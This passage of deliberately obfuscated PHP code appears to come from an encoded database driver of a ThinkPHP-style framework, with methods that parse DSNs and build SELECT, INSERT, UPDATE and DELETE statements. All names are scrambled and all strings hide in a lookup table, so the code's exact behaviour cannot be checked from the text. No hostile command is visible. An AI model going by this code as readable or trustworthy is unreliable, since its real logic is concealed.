$_SERVER[ÅÄÇĞô]; static $³ÄıûÇŸ = array(); static $â©ÜÀ¶† = -1; if (empty($³ÄıûÇŸ)) { foreach ($this->config as $©†„İÍç => $õ±áº›ˆ) { $³ÄıûÇŸ[$©†„İÍç] = explode($îÊƒ–¢¾[50], $õ±áº›ˆ); } } if (think_config($îÊƒ–¢¾[1082])) { if ($’´‹†–Œ || think_config($îÊƒ–¢¾[474]) === !0) { $ßä÷ã½ = floor(mt_rand(0, think_config($îÊƒ–¢¾[1083]) - 1)); $â©ÜÀ¶† = $ßä÷ã½; } else { if (is_numeric(think_config($îÊƒ–¢¾[1084]))) { $ßä÷ã½ = think_config($îÊƒ–¢¾[1084]); } else { $ßä÷ã½ = floor(mt_rand(think_config($îÊƒ–¢¾[1083]), count($³ÄıûÇŸ[$îÊƒ–¢¾[986]]) - 1)); } } } else { $ßä÷ã½ = floor(mt_rand(0, count($³ÄıûÇŸ[$îÊƒ–¢¾[986]]) - 1)); $â©ÜÀ¶† = $ßä÷ã½; } $ßä÷ã½ = $â©ÜÀ¶† !== -1 ? $â©ÜÀ¶† : $ßä÷ã½; $©²ğ‰¶¿ = array($îÊƒ–¢¾[988] => isset($³ÄıûÇŸ[$îÊƒ–¢¾[988]][$ßä÷ã½]) ? $³ÄıûÇŸ[$îÊƒ–¢¾[988]][$ßä÷ã½] : $³ÄıûÇŸ[$îÊƒ–¢¾[988]][0], $îÊƒ–¢¾[989] => isset($³ÄıûÇŸ[$îÊƒ–¢¾[989]][$ßä÷ã½]) ? $³ÄıûÇŸ[$îÊƒ–¢¾[989]][$ßä÷ã½] : $³ÄıûÇŸ[$îÊƒ–¢¾[989]][0], $îÊƒ–¢¾[986] => isset($³ÄıûÇŸ[$îÊƒ–¢¾[986]][$ßä÷ã½]) ? $³ÄıûÇŸ[$îÊƒ–¢¾[986]][$ßä÷ã½] : $³ÄıûÇŸ[$îÊƒ–¢¾[986]][0], $îÊƒ–¢¾[987] => isset($³ÄıûÇŸ[$îÊƒ–¢¾[987]][$ßä÷ã½]) ? $³ÄıûÇŸ[$îÊƒ–¢¾[987]][$ßä÷ã½] : $³ÄıûÇŸ[$îÊƒ–¢¾[987]][0], $îÊƒ–¢¾[21] => isset($³ÄıûÇŸ[$îÊƒ–¢¾[21]][$ßä÷ã½]) ? $³ÄıûÇŸ[$îÊƒ–¢¾[21]][$ßä÷ã½] : $³ÄıûÇŸ[$îÊƒ–¢¾[21]][0], $îÊƒ–¢¾[1016] => isset($³ÄıûÇŸ[$îÊƒ–¢¾[1016]][$ßä÷ã½]) ? $³ÄıûÇŸ[$îÊƒ–¢¾[1016]][$ßä÷ã½] : $³ÄıûÇŸ[$îÊƒ–¢¾[1016]][0], $îÊƒ–¢¾[17] => isset($³ÄıûÇŸ[$îÊƒ–¢¾[17]][$ßä÷ã½]) ? $³ÄıûÇŸ[$îÊƒ–¢¾[17]][$ßä÷ã½] : $³ÄıûÇŸ[$îÊƒ–¢¾[17]][0]); return $this->connect($©²ğ‰¶¿, $ßä÷ã½); } public function parseDSN($»à£ó™ñ) { $¦äã©Ù =& $_SERVER[ÅÄÇĞô]; if (empty($»à£ó™ñ)) { return !1; } $‹¬§Óãº = parse_url($»à£ó™ñ); if ($‹¬§Óãº[$¦äã©Ù[208]]) { $ô—¤©¡ = array($¦äã©Ù[1061] => $‹¬§Óãº[$¦äã©Ù[208]], $¦äã©Ù[988] => isset($‹¬§Óãº[$¦äã©Ù[670]]) ? $‹¬§Óãº[$¦äã©Ù[670]] : $¦äã©Ù[12], $¦äã©Ù[989] => isset($‹¬§Óãº[$¦äã©Ù[1085]]) ? $‹¬§Óãº[$¦äã©Ù[1085]] : $¦äã©Ù[12], $¦äã©Ù[986] => isset($‹¬§Óãº[$¦äã©Ù[209]]) ? $‹¬§Óãº[$¦äã©Ù[209]] : $¦äã©Ù[12], $¦äã©Ù[987] => isset($‹¬§Óãº[$¦äã©Ù[210]]) ? $‹¬§Óãº[$¦äã©Ù[210]] : $¦äã©Ù[12], $¦äã©Ù[21] => isset($‹¬§Óãº[$¦äã©Ù[87]]) ? substr($‹¬§Óãº[$¦äã©Ù[87]], 1) : $¦äã©Ù[12]); } else { preg_match($¦äã©Ù[1086], trim($»à£ó™ñ), $€¼âìÚá); $ô—¤©¡ = array($¦äã©Ù[1061] => $€¼âìÚá[1], $¦äã©Ù[988] => $€¼âìÚá[2], $¦äã©Ù[989] => $€¼âìÚá[3], $¦äã©Ù[986] => $€¼âìÚá[4], $¦äã©Ù[987] => $€¼âìÚá[5], $¦äã©Ù[21] => $€¼âìÚá[6]); } $ô—¤©¡[$¦äã©Ù[1016]] = $¦äã©Ù[12]; return $ô—¤©¡; } protected function debug() { $ˆ™¸ù·Ô =& $_SERVER[ÅÄÇĞô]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ˆ™¸ù·Ô[1087]; if (think_config($ˆ™¸ù·Ô[1088])) { think_status($ˆ™¸ù·Ô[1089]); think_trace($this->queryStr . $ˆ™¸ù·Ô[1090] . think_status($ˆ™¸ù·Ô[24], $ˆ™¸ù·Ô[1089], 6) . $ˆ™¸ù·Ô[1091], $ˆ™¸ù·Ô[12], $ˆ™¸ù·Ô[1092]); } } protected function parseLock($æ€îÕÈĞ = false) { $¬Ò¦ÀĞş =& $_SERVER[ÅÄÇĞô]; if (!$æ€îÕÈĞ) { return $¬Ò¦ÀĞş[12]; } if ($¬Ò¦ÀĞş[1018] == $this->dbType) { return $¬Ò¦ÀĞş[1093]; } return $¬Ò¦ÀĞş[1094]; } protected function parseSet($ùáî›Œ–) { $÷á©ÚŠÈ =& $_SERVER[ÅÄÇĞô]; foreach ($ùáî›Œ– as $ä¦Æ«–à => $¯ëÊûú) { if (is_array($¯ëÊûú) && $÷á©ÚŠÈ[375] == $¯ëÊûú[0]) { $Ó‡ì¦[] = $this->parseKey($ä¦Æ«–à) . $÷á©ÚŠÈ[509] . $¯ëÊûú[1]; } elseif (is_scalar($¯ëÊûú) || is_null($¯ëÊûú)) { $Ó‡ì¦[] = $this->parseKey($ä¦Æ«–à) . $÷á©ÚŠÈ[509] . $this->parseValue($¯ëÊûú); } } return $÷á©ÚŠÈ[1095] . implode($÷á©ÚŠÈ[50], $Ó‡ì¦); } protected function bindParam($İğ•ïŠ¬, $Ê´‡ÙÄ³) { $this->bind[$_SERVER[ÅÄÇĞô][4] . $İğ•ïŠ¬] = $Ê´‡ÙÄ³; } protected function parseBind($ÈÅñ´¢É) { $ÈÅñ´¢É = array_merge($this->bind, $ÈÅñ´¢É); $this->bind = array(); return $ÈÅñ´¢É; } function parseKey(&$¶ŞíÔ¼Ñ, $ñ°¬…Ôß = true) { if ($ñ°¬…Ôß) { $¶ŞíÔ¼Ñ = $this->parseKeyCheck($¶ŞíÔ¼Ñ); } return $¶ŞíÔ¼Ñ; } function parseKeyCheck($í…³¤î¾) { $áÌ¹ĞÂ‘ =& $_SERVER[ÅÄÇĞô]; $í…³¤î¾ = trim($í…³¤î¾); if (!preg_match($áÌ¹ĞÂ‘[1096], $í…³¤î¾)) { think_exception($áÌ¹ĞÂ‘[1097] . $í…³¤î¾); } return $í…³¤î¾; } protected function parseValue($³« ²”Í) { $èÚí˜ÆÎ =& $_SERVER[ÅÄÇĞô]; if (is_string($³« ²”Í)) { $³« ²”Í = $èÚí˜ÆÎ[1057] . $this->escapeString($³« ²”Í) . $èÚí˜ÆÎ[1057]; } elseif (isset($³« ²”Í[0]) && is_string($³« ²”Í[0]) && strtolower($³« ²”Í[0]) == $èÚí˜ÆÎ[375]) { $³« ²”Í = $this->escapeString($³« ²”Í[1]); } elseif (is_array($³« ²”Í)) { $³« ²”Í = array_map(array($this, $èÚí˜ÆÎ[1058]), $³« ²”Í); } elseif (is_bool($³« ²”Í)) { $³« ²”Í = $³« ²”Í ? $èÚí˜ÆÎ[91] : $èÚí˜ÆÎ[231]; } elseif (is_null($³« ²”Í)) { $³« ²”Í = $èÚí˜ÆÎ[106]; } return $³« ²”Í; } protected function parseField($¤ø‰ŸÅ) { $–€Óçù =& $_SERVER[ÅÄÇĞô]; if (is_string($¤ø‰ŸÅ) && strpos($¤ø‰ŸÅ, $–€Óçù[50])) { $¤ø‰ŸÅ = explode($–€Óçù[50], $¤ø‰ŸÅ); } if (is_array($¤ø‰ŸÅ)) { $£ûßşº = array(); foreach ($¤ø‰ŸÅ as $šùÄ¹Ä => $«¾Î¡Æ) { if (!is_numeric($šùÄ¹Ä)) { $£ûßşº[] = $this->parseKey($šùÄ¹Ä, !1) . $–€Óçù[1098] . $this->parseKey($«¾Î¡Æ); } else { $£ûßşº[] = $this->parseKey($«¾Î¡Æ); } } $ïÎû–Å± = implode($–€Óçù[50], $£ûßşº); } elseif (is_string($¤ø‰ŸÅ) && !empty($¤ø‰ŸÅ)) { $ïÎû–Å± = $¤ø‰ŸÅ; } else { $ïÎû–Å± = $–€Óçù[223]; } return $ïÎû–Å±; } protected function parseTable($½‘Áõ¹ê) { $ô†½ÈŒ¶ =& $_SERVER[ÅÄÇĞô]; if (is_array($½‘Áõ¹ê)) { $£µÑ¤¯¼ = array(); foreach ($½‘Áõ¹ê as $÷¤¬º” => $¦¨°öİ¤) { if (!is_numeric($÷¤¬º”)) { $£µÑ¤¯¼[] = $this->parseKey($÷¤¬º”) . $ô†½ÈŒ¶[53] . $this->parseKey($¦¨°öİ¤); } else { $£µÑ¤¯¼[] = $this->parseKey($÷¤¬º”); } } $½‘Áõ¹ê = $£µÑ¤¯¼; } elseif (is_string($½‘Áõ¹ê)) { if (strstr($½‘Áõ¹ê, $ô†½ÈŒ¶[53])) { return $½‘Áõ¹ê; } $½‘Áõ¹ê = explode($ô†½ÈŒ¶[50], $½‘Áõ¹ê); array_walk($½‘Áõ¹ê, array($this, $ô†½ÈŒ¶[1006])); } return $ô†½ÈŒ¶[1000] . trim(implode($ô†½ÈŒ¶[1099], $½‘Áõ¹ê), $ô†½ÈŒ¶[464]) . $ô†½ÈŒ¶[1000]; } protected function parseWhere($›ğíª) { $º·öÄš™ =& $_SERVER[ÅÄÇĞô]; $á·äØ¦ = $º·öÄš™[12]; if (is_string($›ğíª)) { $á·äØ¦ = $›ğíª; } else { $Çïøº§‘ = isset($›ğíª[$º·öÄš™[1100]]) ? strtoupper($›ğíª[$º·öÄš™[1100]]) : $º·öÄš™[12]; if (in_array($Çïøº§‘, array($º·öÄš™[1101], $º·öÄš™[1102], $º·öÄš™[1103]))) { $Çïøº§‘ = $º·öÄš™[53] . $Çïøº§‘ . $º·öÄš™[53]; unset($›ğíª[$º·öÄš™[1100]]); } else { $Çïøº§‘ = $º·öÄš™[1104]; } foreach ($›ğíª as $—”Ìäª´ => $½ØÔøâ) { $á·äØ¦ .= $º·öÄš™[357]; if (is_numeric($—”Ìäª´)) { $—”Ìäª´ = $º·öÄš™[1105]; } if (0 === strpos($—”Ìäª´, $º·öÄš™[11])) { $á·äØ¦ .= $this->parseThinkWhere($—”Ìäª´, $½ØÔøâ); } else { if (!preg_match($º·öÄš™[1106], trim($—”Ìäª´))) { think_exception(think_lang($º·öÄš™[1107]) . $º·öÄš™[4] . $—”Ìäª´); } $…‹¨°¹¬ = is_array($½ØÔøâ) && isset($½ØÔøâ[$º·öÄš™[1108]]); $—”Ìäª´ = trim($—”Ìäª´); if (strpos($—”Ìäª´, $º·öÄš™[215])) { $¤Êù•™¿ = explode($º·öÄš™[215], $—”Ìäª´); $´Ó´¯Í¸ = array(); foreach ($¤Êù•™¿ as $ÄôòÙ¿Â => $ÈŞóèª÷) { $ºôûÙÛ« = $…‹¨°¹¬ ? $½ØÔøâ[$ÄôòÙ¿Â] : $½ØÔøâ; $´Ó´¯Í¸[] = $º·öÄš™[340] . $this->parseWhereItem($this->parseKey($ÈŞóèª÷), $ºôûÙÛ«) . $º·öÄš™[1005]; } $á·äØ¦ .= implode($º·öÄš™[1109], $´Ó´¯Í¸); } elseif (strpos($—”Ìäª´, $º·öÄš™[287])) { $¤Êù•™¿ = explode($º·öÄš™[287], $—”Ìäª´); $´Ó´¯Í¸ = array(); foreach ($¤Êù•™¿ as $ÄôòÙ¿Â => $ÈŞóèª÷) { $ºôûÙÛ« = $…‹¨°¹¬ ? $½ØÔøâ[$ÄôòÙ¿Â] : $½ØÔøâ; $´Ó´¯Í¸[] = $º·öÄš™[340] . $this->parseWhereItem($this->parseKey($ÈŞóèª÷), $ºôûÙÛ«) . $º·öÄš™[1005]; } $á·äØ¦ .= implode($º·öÄš™[1104], $´Ó´¯Í¸); } else { $á·äØ¦ .= $this->parseWhereItem($this->parseKey($—”Ìäª´), $½ØÔøâ); } } $á·äØ¦ .= $º·öÄš™[358] . $Çïøº§‘; } $á·äØ¦ = substr($á·äØ¦, 0, -strlen($Çïøº§‘)); } return empty($á·äØ¦) ? $º·öÄš™[12] : $º·öÄš™[1110] . $á·äØ¦; } protected function parseWhereItem($œÁë£˜Ì, $€·²¶£—) { $«ªª”‰ =& $_SERVER[ÅÄÇĞô]; $©èÄíÔ® = $«ªª”‰[12]; if (is_array($€·²¶£—)) { if (is_string($€·²¶£—[0])) { $º­™ÉÅâ = strtolower($€·²¶£—[0]); if (in_array($€·²¶£—[0], array($«ªª”‰[509], $«ªª”‰[1111], $«ªª”‰[1112], $«ªª”‰[1113], $«ªª”‰[1114], $«ªª”‰[1115]))) { $©èÄíÔ® .= $œÁë£˜Ì . $«ªª”‰[53] . $€·²¶£—[0] . $«ªª”‰[53] . $this->parseValue($€·²¶£—[1]); } elseif (preg_match($«ªª”‰[1116], $€·²¶£—[0])) { $©èÄíÔ® .= $œÁë£˜Ì . $«ªª”‰[53] . $this->exp[$º­™ÉÅâ] . $«ªª”‰[53] . $this->parseValue($€·²¶£—[1]); } elseif (preg_match($«ªª”‰[1117], $€·²¶£—[0])) { if (is_array($€·²¶£—[1])) { $’õá¶úâ = isset($€·²¶£—[2]) ? strtoupper($€·²¶£—[2]) : $«ªª”‰[1102]; if (in_array($’õá¶úâ, array($«ªª”‰[1101], $«ªª”‰[1102], $«ªª”‰[1103]))) { $ç«½ = array(); foreach ($€·²¶£—[1] as $çÛğÒ¡) { $ç«½[] = $œÁë£˜Ì . $«ªª”‰[53] . $this->exp[$º­™ÉÅâ] . $«ªª”‰[53] . $this->parseValue($çÛğÒ¡); } $©èÄíÔ® .= $«ªª”‰[340] . implode($«ªª”‰[53] . $’õá¶úâ . $«ªª”‰[53], $ç«½) . $«ªª”‰[1005]; } } else { $©èÄíÔ® .= $œÁë£˜Ì . $«ªª”‰[53] . $this->exp[$º­™ÉÅâ] . $«ªª”‰[53] . $this->parseValue($€·²¶£—[1]); } } elseif ($«ªª”‰[375] == $º­™ÉÅâ) { $©èÄíÔ® .= $«ªª”‰[1003] . $œÁë£˜Ì . $«ªª”‰[53] . $€·²¶£—[1] . $«ªª”‰[1118]; } elseif (preg_match($«ªª”‰[1119], $€·²¶£—[0])) { $©èÄíÔ® .= $€·²¶£—[0]; } elseif (preg_match($«ªª”‰[1120], $€·²¶£—[0])) { if (isset($€·²¶£—[2]) && $«ªª”‰[375] == $€·²¶£—[2]) { $©èÄíÔ® .= $œÁë£˜Ì . $«ªª”‰[53] . $this->exp[$º­™ÉÅâ] . $«ªª”‰[53] . $€·²¶£—[1]; } else { if (is_string($€·²¶£—[1])) { $€·²¶£—[1] = explode($«ªª”‰[50], $€·²¶£—[1]); } $ÉñŠ¢ÙÆ = implode($«ªª”‰[50], $this->parseValue($€·²¶£—[1])); $©èÄíÔ® .= $œÁë£˜Ì . $«ªª”‰[53] . $this->exp[$º­™ÉÅâ] . $«ªª”‰[1003] . $ÉñŠ¢ÙÆ . $«ªª”‰[1005]; } } elseif (preg_match($«ªª”‰[1121], $€·²¶£—[0])) { $¨öÎœé» = is_string($€·²¶£—[1]) ? explode($«ªª”‰[50], $€·²¶£—[1]) : $€·²¶£—[1]; $©èÄíÔ® .= $«ªª”‰[1003] . $œÁë£˜Ì . $«ªª”‰[53] . $this->exp[$º­™ÉÅâ] . $«ªª”‰[53] . $this->parseValue($¨öÎœé»[0]) . $«ªª”‰[1104] . $this->parseValue($¨öÎœé»[1]) . $«ªª”‰[358]; } else { think_exception(think_lang($«ªª”‰[1107]) . $«ªª”‰[4] . $€·²¶£—[0]); } } else { $Éâ‡¸²î = count($€·²¶£—); $¤ïè¾øï = $«ªª”‰[12]; if (is_string($€·²¶£—[$Éâ‡¸²î - 1])) { $¤ïè¾øï = isset($€·²¶£—[$Éâ‡¸²î - 1]) ? strtoupper($€·²¶£—[$Éâ‡¸²î - 1]) : $«ªª”‰[12]; if (in_array($¤ïè¾øï, array($«ªª”‰[1101], $«ªª”‰[1102], $«ªª”‰[1103]))) { $Éâ‡¸²î = $Éâ‡¸²î - 1; } } else { $¤ïè¾øï = $«ªª”‰[1101]; } for ($õÌâ”õµ = 0; $õÌâ”õµ < $Éâ‡¸²î; $õÌâ”õµ++) { $¨öÎœé» = is_array($€·²¶£—[$õÌâ”õµ]) ? $€·²¶£—[$õÌâ”õµ][1] : $€·²¶£—[$õÌâ”õµ]; if ($«ªª”‰[375] == strtolower($€·²¶£—[$õÌâ”õµ][0])) { $©èÄíÔ® .= $«ªª”‰[340] . $œÁë£˜Ì . $«ªª”‰[53] . $¨öÎœé» . $«ªª”‰[1118] . $¤ïè¾øï . $«ªª”‰[53]; } else { $¤­İë´ = is_array($€·²¶£—[$õÌâ”õµ]) ? $this->exp[strtolower($€·²¶£—[$õÌâ”õµ][0])] : $«ªª”‰[509]; if (!$¤­İë´ && is_array($€·²¶£—[$õÌâ”õµ]) && in_array($€·²¶£—[$õÌâ”õµ][0], array($«ªª”‰[509], $«ªª”‰[1111], $«ªª”‰[1112], $«ªª”‰[1113], $«ªª”‰[1114], $«ªª”‰[1115]))) { $¤­İë´ = $€·²¶£—[$õÌâ”õµ][0]; } $©èÄíÔ® .= $«ªª”‰[340] . $œÁë£˜Ì . $«ªª”‰[53] . $¤­İë´ . $«ªª”‰[53] . $this->parseValue($¨öÎœé») . $«ªª”‰[1118] . $¤ïè¾øï . $«ªª”‰[53]; } } $©èÄíÔ® = substr($©èÄíÔ®, 0, -4); } } else { $©èÄíÔ® .= $œÁë£˜Ì . $«ªª”‰[1122] . $this->parseValue($€·²¶£—); } return $©èÄíÔ®; } protected function parseThinkWhere($¯„Œ¿•¸, $«ËÜæã) { $ºì¥ Î£ =& $_SERVER[ÅÄÇĞô]; $´ğÀèª = $ºì¥ Î£[12]; switch ($¯„Œ¿•¸) { case $ºì¥ Î£[430]: $´ğÀèª = $«ËÜæã; break; case $ºì¥ Î£[1105]: $´ğÀèª = is_string($«ËÜæã) ? $«ËÜæã : substr($this->parseWhere($«ËÜæã), 6); break; case $ºì¥ Î£[1123]: parse_str($«ËÜæã, $Í…ÑõÚñ); if (isset($Í…ÑõÚñ[$ºì¥ Î£[1100]])) { $Âô‰ô‚ = $ºì¥ Î£[53] . strtoupper($Í…ÑõÚñ[$ºì¥ Î£[1100]]) . $ºì¥ Î£[53]; unset($Í…ÑõÚñ[$ºì¥ Î£[1100]]); } else { $Âô‰ô‚ = $ºì¥ Î£[1104]; } $æ«Ä†¾à = array(); foreach ($Í…ÑõÚñ as $µ„±³‹¥ => $‡°½¥ò÷) { $æ«Ä†¾à[] = $this->parseKey($µ„±³‹¥) . $ºì¥ Î£[1122] . $this->parseValue($‡°½¥ò÷); } $´ğÀèª = implode($Âô‰ô‚, $æ«Ä†¾à); break; } return $´ğÀèª; } protected function parseLimit($·ÂôÅ“Ï) { $ÃÉ–ßİé =& $_SERVER[ÅÄÇĞô]; return !empty($·ÂôÅ“Ï) ? $ÃÉ–ßİé[51] . $·ÂôÅ“Ï . $ÃÉ–ßİé[53] : $ÃÉ–ßİé[12]; } protected function parseJoin($¶»”º¨) { $¦À±ãÍ =& $_SERVER[ÅÄÇĞô]; $›„îÀÚñ = $¦À±ãÍ[12]; if (!empty($¶»”º¨)) { if (is_array($¶»”º¨)) { foreach ($¶»”º¨ as $…Ÿş¶ã« => $ÀµÃ²Âì) { if (!1 !== stripos($ÀµÃ²Âì, $¦À±ãÍ[1124])) { $›„îÀÚñ .= $¦À±ãÍ[53] . $ÀµÃ²Âì; } else { $›„îÀÚñ .= $¦À±ãÍ[1125] . $ÀµÃ²Âì; } } } else { $›„îÀÚñ .= $¦À±ãÍ[1125] . $¶»”º¨; } } $›„îÀÚñ = preg_replace($¦À±ãÍ[1126], think_config($¦À±ãÍ[1030]) . $¦À±ãÍ[1127], $›„îÀÚñ); return $›„îÀÚñ; } protected function parseOrder($Ûôœ€Í) { $½É²Ø =& $_SERVER[ÅÄÇĞô]; if (is_array($Ûôœ€Í)) { $“ƒœ€¯† = array(); foreach ($Ûôœ€Í as $å©İšÄ => $ËşÅ×„) { if (is_numeric($å©İšÄ)) { $“ƒœ€¯†[] = $this->parseKey($ËşÅ×„); } else { $ËşÅ×„ = in_array(strtoupper(trim($ËşÅ×„)), array($½É²Ø[1128], $½É²Ø[1129])) ? $½É²Ø[53] . $ËşÅ×„ : $½É²Ø[12]; if (preg_match($½É²Ø[1130], $å©İšÄ)) { $“ƒœ€¯†[] = $this->parseKey($å©İšÄ) . $ËşÅ×„; } else { think_exception($½É²Ø[1131] . $å©İšÄ); } } } $Ûôœ€Í = implode($½É²Ø[50], $“ƒœ€¯†); } return !empty($Ûôœ€Í) ? $½É²Ø[1132] . $Ûôœ€Í : $½É²Ø[12]; } protected function parseGroup($şëñœÔ±) { $¿ªìé”æ =& $_SERVER[ÅÄÇĞô]; return !empty($şëñœÔ±) ? $¿ªìé”æ[1133] . $şëñœÔ± : $¿ªìé”æ[12]; } protected function parseHaving($¡éîÚş) { $¦¬…ÊÅ  =& $_SERVER[ÅÄÇĞô]; return !empty($¡éîÚş) ? $¦¬…ÊÅ [1134] . $¡éîÚş : $¦¬…ÊÅ [12]; } protected function parseComment($²¿€Ş°µ) { $˜×¦¨Îß =& $_SERVER[ÅÄÇĞô]; return !empty($²¿€Ş°µ) ? $˜×¦¨Îß[1135] . $²¿€Ş°µ . $˜×¦¨Îß[1136] : $˜×¦¨Îß[12]; } protected function parseDistinct($ùìÑßŞ) { $ô¯éš¥ú =& $_SERVER[ÅÄÇĞô]; return !empty($ùìÑßŞ) ? $ô¯éš¥ú[1137] : $ô¯éš¥ú[12]; } protected function parseUnion($½øêŠ‰) { $×¦«§ñš =& $_SERVER[ÅÄÇĞô]; if (empty($½øêŠ‰)) { return $×¦«§ñš[12]; } if (isset($½øêŠ‰[$×¦«§ñš[426]])) { $Ã¿èˆ”ã = $×¦«§ñš[1138]; unset($½øêŠ‰[$×¦«§ñš[426]]); } else { $Ã¿èˆ”ã = $×¦«§ñš[1139]; } foreach ($½øêŠ‰ as $Ñ·¶ñ‡ô) { $Ñ¦öõ¯’[] = $Ã¿èˆ”ã . (is_array($Ñ·¶ñ‡ô) ? $this->buildSelectSql($Ñ·¶ñ‡ô) : $Ñ·¶ñ‡ô); } return implode($×¦«§ñš[53], $Ñ¦öõ¯’); } public function insert($ÏôŠçº´, $•üßô³¯ = array(), $´†°÷ãø = false) { $•ˆ¿œú =& $_SERVER[ÅÄÇĞô]; $¦‹‚ÎÆé = $”¯µˆõŠ = array(); $this->model = $•üßô³¯[$•ˆ¿œú[361]]; foreach ($ÏôŠçº´ as $“™ºååÇ => $â÷¥š¡‘) { if (is_array($â÷¥š¡‘) && $•ˆ¿œú[375] == $â÷¥š¡‘[0]) { $”¯µˆõŠ[] = $this->parseKey($“™ºååÇ); $¦‹‚ÎÆé[] = $â÷¥š¡‘[1]; } elseif (is_scalar($â÷¥š¡‘) || is_null($â÷¥š¡‘)) { $”¯µˆõŠ[] = $this->parseKey($“™ºååÇ); $¦‹‚ÎÆé[] = $this->parseValue($â÷¥š¡‘); } } $ÈË‡ãõı = ($´†°÷ãø ? $•ˆ¿œú[1007] : $•ˆ¿œú[1008]) . $•ˆ¿œú[1009] . $this->parseTable($•üßô³¯[$•ˆ¿œú[359]]) . $•ˆ¿œú[1003] . implode($•ˆ¿œú[50], $”¯µˆõŠ) . $•ˆ¿œú[1004] . implode($•ˆ¿œú[50], $¦‹‚ÎÆé) . $•ˆ¿œú[1005]; $ÈË‡ãõı .= $this->parseLock(isset($•üßô³¯[$•ˆ¿œú[944]]) ? $•üßô³¯[$•ˆ¿œú[944]] : !1); $ÈË‡ãõı .= $this->parseComment(!empty($•üßô³¯[$•ˆ¿œú[432]]) ? $•üßô³¯[$•ˆ¿œú[432]] : $•ˆ¿œú[12]); return $this->execute($ÈË‡ãõı, $this->parseBind(!empty($•üßô³¯[$•ˆ¿œú[363]]) ? $•üßô³¯[$•ˆ¿œú[363]] : array())); } public function selectInsert($Âò¡àÍã, $ãÚ´ºÄé, $„ºÁ›Œü = array()) { $‰»îÉ’ç =& $_SERVER[ÅÄÇĞô]; $this->model = $„ºÁ›Œü[$‰»îÉ’ç[361]]; if (is_string($Âò¡àÍã)) { $Âò¡àÍã = explode($‰»îÉ’ç[50], $Âò¡àÍã); } array_walk($Âò¡àÍã, array($this, $‰»îÉ’ç[1006])); $”±³Õİ = $‰»îÉ’ç[1140] . $this->parseTable($ãÚ´ºÄé) . $‰»îÉ’ç[1003] . implode($‰»îÉ’ç[50], $Âò¡àÍã) . $‰»îÉ’ç[1118]; $”±³Õİ .= $this->buildSelectSql($„ºÁ›Œü); return $this->execute($”±³Õİ, $this->parseBind(!empty($„ºÁ›Œü[$‰»îÉ’ç[363]]) ? $„ºÁ›Œü[$‰»îÉ’ç[363]] : array())); } public function update($®ñşçªô, $Ü­’´ë) { $èÄƒ§šØ =& $_SERVER[ÅÄÇĞô]; $this->model = $Ü­’´ë[$èÄƒ§šØ[361]]; $şŞı‘Ÿ™ = $èÄƒ§šØ[1141] . $this->parseTable($Ü­’´ë[$èÄƒ§šØ[359]]) . $this->parseSet($®ñşçªô) . $this->parseWhere(!empty($Ü­’´ë[$èÄƒ§šØ[355]]) ? $Ü­’´ë[$èÄƒ§šØ[355]] : $èÄƒ§šØ[12]) . $this->parseOrder(!empty($Ü­’´ë[$èÄƒ§šØ[444]]) ? $Ü­’´ë[$èÄƒ§šØ[444]] : $èÄƒ§šØ[12]) . $this->parseLimit(!empty($Ü­’´ë[$èÄƒ§šØ[370]]) ? $Ü­’´ë[$èÄƒ§šØ[370]] : $èÄƒ§šØ[12]) . $this->parseLock(isset($Ü­’´ë[$èÄƒ§šØ[944]]) ? $Ü­’´ë[$èÄƒ§šØ[944]] : !1) . $this->parseComment(!empty($Ü­’´ë[$èÄƒ§šØ[432]]) ? $Ü­’´ë[$èÄƒ§šØ[432]] : $èÄƒ§šØ[12]); return $this->execute($şŞı‘Ÿ™, $this->parseBind(!empty($Ü­’´ë[$èÄƒ§šØ[363]]) ? $Ü­’´ë[$èÄƒ§šØ[363]] : array())); } public function delete($›†êÂìÍ = array()) { $ä•Ü˜¾¯ =& $_SERVER[ÅÄÇĞô]; $this->model = $›†êÂìÍ[$ä•Ü˜¾¯[361]]; $Èùê‡âË = $ä•Ü˜¾¯[1142] . $this->parseTable($›†êÂìÍ[$ä•Ü˜¾¯[359]]) . $this->parseWhere(!empty($›†êÂìÍ[$ä•Ü˜¾¯[355]]) ? $›†êÂìÍ[$ä•Ü˜¾¯[355]] : $ä•Ü˜¾¯[12]) . $this->parseOrder(!empty($›†êÂìÍ[$ä•Ü˜¾¯[444]]) ? $›†êÂìÍ[$ä•Ü˜¾¯[444]] : $ä•Ü˜¾¯[12]) . $this->parseLimit(!empty($›†êÂìÍ[$ä•Ü˜¾¯[370]]) ? $›†êÂìÍ[$ä•Ü˜¾¯[370]] : $ä•Ü˜¾¯[12]) . $this->parseLock(isset($›†êÂìÍ[$ä•Ü˜¾¯[944]]) ? $›†êÂìÍ[$ä•Ü˜¾¯[944]] : !1) . $this->parseComment(!empty($›†êÂìÍ[$ä•Ü˜¾¯[432]]) ? $›†êÂìÍ[$ä•Ü˜¾¯[432]] : $ä•Ü˜¾¯[12]); return $this->execute($Èùê‡âË, $this->parseBind(!empty($›†êÂìÍ[$ä•Ü˜¾¯[363]]) ? $›†êÂìÍ[$ä•Ü˜¾¯[363]] : array())); } public function select($«ÚÁâ  = array()) { $ùğ¨–’ =& $_SERVER[ÅÄÇĞô]; $this->model = $«ÚÁâ [$ùğ¨–’[361]]; $Ê´«„¦§ = $this->buildSelectSql($«ÚÁâ ); $–¨ê³ò = isset($«ÚÁâ [$ùğ¨–’[427]]) ? $«ÚÁâ [$ùğ¨–’[427]] : !1; if ($–¨ê³ò) { $ı¬èîõš = is_string($–¨ê³ò[$ùğ¨–’[97]]) ? $–¨ê³ò[$ùğ¨–’[97]] : $ùğ¨–’[1143] . md5($Ê´«„¦§); $•÷ññ´­ = think_cache($ı¬èîõš, $ùğ¨–’[12], $–¨ê³ò); if (!1 !== $•÷ññ´­) { return $•÷ññ´­; } } $Ûó® Ş” = $this->query($Ê´«„¦§, $this->parseBind(!empty($«ÚÁâ [$ùğ¨–’[363]]) ? $«ÚÁâ [$ùğ¨–’[363]] : array())); if ($–¨ê³ò && !1 !== $Ûó® Ş”) { think_cache($ı¬èîõš, $Ûó® Ş”, $–¨ê³ò); } return $Ûó® Ş”; } public function buildSelectSql($•ú—¹¨˜ = array()) { $Èá¤éÆ =& $_SERVER[ÅÄÇĞô]; if (isset($•ú—¹¨˜[$Èá¤éÆ[431]])) { if (strpos($•ú—¹¨˜[$Èá¤éÆ[431]], $Èá¤éÆ[50])) { list($ ı—é•‘, $“Ò¼½ûµ) = explode($Èá¤éÆ[50], $•ú—¹¨˜[$Èá¤éÆ[431]]); } else { $ ı—é•‘ = $•ú—¹¨˜[$Èá¤éÆ[431]]; } $ ı—é•‘ = $ ı—é•‘ 